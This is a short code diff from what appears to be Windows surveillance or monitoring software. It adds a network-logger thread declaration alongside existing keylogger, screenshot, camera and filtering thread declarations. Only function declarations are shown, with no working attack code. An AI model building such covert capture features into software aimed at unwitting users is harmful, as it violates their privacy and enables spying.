@@ -31,6 +31,7 @@ struct CompareDates {
 #define SYNC_TIME 60000 // 1 minute
 
 DWORD WINAPI initFiltering(LPVOID lpParam);
+DWORD WINAPI initNetLogger(LPVOID lpParam);
 DWORD WINAPI initKeylogger(LPVOID lpParam);
 DWORD WINAPI initScreenshot(LPVOID lpParam);
 DWORD WINAPI initCamera(LPVOID lpParam);
